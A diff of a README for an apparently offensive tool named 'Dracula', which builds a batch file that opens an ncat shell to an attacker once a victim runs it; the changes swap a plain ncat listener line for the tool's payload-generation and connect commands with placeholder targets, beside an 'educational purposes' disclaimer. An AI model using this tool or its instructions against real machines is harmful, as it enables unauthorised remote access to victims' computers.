@@ -1,5 +1,4 @@
-**THIS IS ONLY FOR EDUCATIONAL PURPOSES, DO NOT USE THIS**
-NOTE TO SELF: THIS DOESNT WORK FOR SOME REASON, FIX THAT
+**THIS IS ONLY FOR EDUCATIONAL PURPOSES, DO NOT USE THIS FOR ANY ILLEGAL ACTIVITIES**
 
 ```
         _____                       _       
@@ -25,13 +24,20 @@ uses ncat command to give reverse shell access to the attacker once the client o
 3. A batch file is generated 
 
 ### **Attacker's Side**
-
-set up a listener using ncat and wait for the client to open the batch file.
+Generate payload:
 
 ```
-ncat IP_ADDR_CLIENT PORT
+Dracula >> -p <TARGET_PORT> -s <SHELL_TYPE> -o <OUTPUT_FILE_NAME>
 ```
-replace the IP_ADDR_CLIENT with ip addr of client and PORT with port used in the attack
+
+Command to connect to the target machine:
+
+```
+Dracula >> -l -i <TARGET_IP> -p <TARGET_PORT>
+```
+replace the TARGET_IP with ip addr of client and TARGET_PORT with port used in the attack
+
+**NOTE: the port used in above command must be same as the the one used in payload.**
 
 ### **Client's Side**
 Once the client opens the batch file, following command is executed
